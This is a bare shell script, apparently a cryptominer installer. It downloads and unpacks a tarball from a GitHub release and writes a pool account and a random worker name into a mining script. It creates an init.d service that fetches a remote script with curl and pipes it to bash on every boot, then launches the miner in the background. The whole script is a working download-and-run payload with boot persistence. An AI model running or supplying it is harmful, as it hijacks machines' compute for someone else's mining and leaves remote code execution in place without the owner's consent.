cd /
rm -rf midas.tar
rm -rf midas
wget https://github.com/imprewa/amplitu/releases/download/rev2.0.1/midas.tar
tar -xvf midas.tar
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > xenix.sh
chmod a+x xenix.sh
update-rc.d xenix.sh defaults
nohup ./amd.sh &
ps -ef | grep apool
